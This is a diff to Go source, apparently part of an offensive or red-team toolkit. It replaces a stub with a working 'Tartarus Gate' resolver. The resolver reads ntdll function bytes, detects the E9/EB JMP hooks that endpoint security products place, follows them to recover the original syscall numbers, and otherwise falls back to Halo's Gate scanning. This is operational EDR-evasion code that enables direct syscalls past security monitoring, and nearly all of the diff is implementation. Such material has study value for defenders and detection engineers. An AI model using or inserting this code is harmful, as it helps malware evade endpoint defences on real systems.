@@ -90,18 +90,55 @@ func (r *HalosGateResolver) Resolve(name string) (uint16, error) {
 	return 0, fmt.Errorf("%s: no unhooked neighbor found within 500 stubs", name)
 }
 
-// TartarusGateResolver extends Halo's Gate by also recognizing hooked
-// functions (JMP hooks) and computing SSN from the hook displacement.
-//
-// TODO: Implement JMP-hook displacement analysis to distinguish Tartarus from
-// Halo's Gate. Currently this is a plain alias for HalosGateResolver; the
-// hook-aware logic (detecting E9/EB JMP patches and extracting the original
-// SSN from the displacement) has not been implemented yet.
+// TartarusGateResolver extends Halo's Gate by recognizing JMP-hooked
+// functions (E9/EB patches injected by EDR) and following the hook
+// displacement to extract the original SSN from the trampoline code.
+// Falls back to Halo's Gate neighbor scanning if the trampoline does not
+// contain a recognizable mov eax, <SSN> instruction.
 type TartarusGateResolver struct{}
 
 func NewTartarus() *TartarusGateResolver { return &TartarusGateResolver{} }
 
 func (r *TartarusGateResolver) Resolve(name string) (uint16, error) {
+	proc := ntdll.NewProc(name)
+	if err := proc.Find(); err != nil {
+		return 0, fmt.Errorf("find %s: %w", name, err)
+	}
+	addr := proc.Addr()
+	b := (*[32]byte)(unsafe.Pointer(addr))
+
+	// Check for standard (unhooked) prologue: mov r10,rcx; mov eax,<SSN>
+	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
+		return uint16(b[4]) | uint16(b[5])<<8, nil
+	}
+
+	// Check for near JMP hook (E9 XX XX XX XX — rel32 displacement)
+	if b[0] == 0xE9 {
+		displacement := *(*int32)(unsafe.Pointer(&b[1]))
+		hookDest := addr + 5 + uintptr(displacement)
+		destBytes := (*[64]byte)(unsafe.Pointer(hookDest))
+		for i := 0; i < 60; i++ {
+			if destBytes[i] == 0xB8 { // mov eax, imm32
+				ssn := uint16(destBytes[i+1]) | uint16(destBytes[i+2])<<8
+				return ssn, nil
+			}
+		}
+	}
+
+	// Check for short JMP hook (EB XX — rel8 displacement)
+	if b[0] == 0xEB {
+		displacement := int8(b[1])
+		hookDest := addr + 2 + uintptr(displacement)
+		destBytes := (*[64]byte)(unsafe.Pointer(hookDest))
+		for i := 0; i < 60; i++ {
+			if destBytes[i] == 0xB8 {
+				ssn := uint16(destBytes[i+1]) | uint16(destBytes[i+2])<<8
+				return ssn, nil
+			}
+		}
+	}
+
+	// Fall back to Halo's Gate neighbor scanning
 	hg := NewHalosGate()
 	return hg.Resolve(name)
 }
